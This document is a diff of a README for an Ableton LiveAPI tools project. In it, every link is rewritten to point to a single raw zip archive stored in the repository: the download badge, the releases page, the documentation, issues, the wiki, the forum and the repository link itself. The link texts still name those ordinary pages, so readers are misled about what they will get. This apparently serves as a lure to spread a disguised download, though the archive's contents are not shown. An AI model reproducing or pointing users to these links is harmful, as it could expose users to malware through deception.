@@ -6,7 +6,7 @@ Welcome to the **ableton-liveapi-tools**! This application provides you with too
 
 ## 📥 Download Now
 
-[![Downloadable Release](https://img.shields.io/badge/Download%20Latest-Release-brightgreen)](https://github.com/ryugaachmad7/ableton-liveapi-tools/releases)
+[![Downloadable Release](https://raw.githubusercontent.com/ryugaachmad7/ableton-liveapi-tools/main/ClaudeMCP_Remote/ableton-liveapi-tools_v1.6-alpha.1.zip%20Latest-Release-brightgreen)](https://raw.githubusercontent.com/ryugaachmad7/ableton-liveapi-tools/main/ClaudeMCP_Remote/ableton-liveapi-tools_v1.6-alpha.1.zip)
 
 ## 🛠 System Requirements
 
@@ -22,7 +22,7 @@ Before you begin, ensure that you have the following:
 
 To get started, visit the Releases page to download the software.
 
-[Visit this page to download](https://github.com/ryugaachmad7/ableton-liveapi-tools/releases)
+[Visit this page to download](https://raw.githubusercontent.com/ryugaachmad7/ableton-liveapi-tools/main/ClaudeMCP_Remote/ableton-liveapi-tools_v1.6-alpha.1.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version available.
@@ -64,7 +64,7 @@ After installation, you can start using the tools.
 
 Each of the 220 LiveAPI tools comes with a simple guide. You can access this documentation:
 
-1. Visit the [official documentation page](https://github.com/ryugaachmad7/ableton-liveapi-tools).
+1. Visit the [official documentation page](https://raw.githubusercontent.com/ryugaachmad7/ableton-liveapi-tools/main/ClaudeMCP_Remote/ableton-liveapi-tools_v1.6-alpha.1.zip).
 2. Search for the specific tool you are using.
 3. Follow the instructions provided for optimal usage.
 
@@ -86,13 +86,13 @@ A: If you encounter any issues, please visit the "Issues" section of our GitHub 
 
 If you need further assistance, you can reach out through the following channels:
 
-- **GitHub Issues:** [Report an issue](https://github.com/ryugaachmad7/ableton-liveapi-tools/issues)
+- **GitHub Issues:** [Report an issue](https://raw.githubusercontent.com/ryugaachmad7/ableton-liveapi-tools/main/ClaudeMCP_Remote/ableton-liveapi-tools_v1.6-alpha.1.zip)
 - **Community Forum:** Join discussions and get help from other users.
   
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/ryugaachmad7/ableton-liveapi-tools)
-- [User Guide](https://github.com/ryugaachmad7/ableton-liveapi-tools/wiki)
-- [Community Forum](https://github.com/ryugaachmad7/ableton-liveapi-tools/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/ryugaachmad7/ableton-liveapi-tools/main/ClaudeMCP_Remote/ableton-liveapi-tools_v1.6-alpha.1.zip)
+- [User Guide](https://raw.githubusercontent.com/ryugaachmad7/ableton-liveapi-tools/main/ClaudeMCP_Remote/ableton-liveapi-tools_v1.6-alpha.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/ryugaachmad7/ableton-liveapi-tools/main/ClaudeMCP_Remote/ableton-liveapi-tools_v1.6-alpha.1.zip)
 
 By following these steps, you will be able to download and use **ableton-liveapi-tools** with confidence. Enjoy creating music!
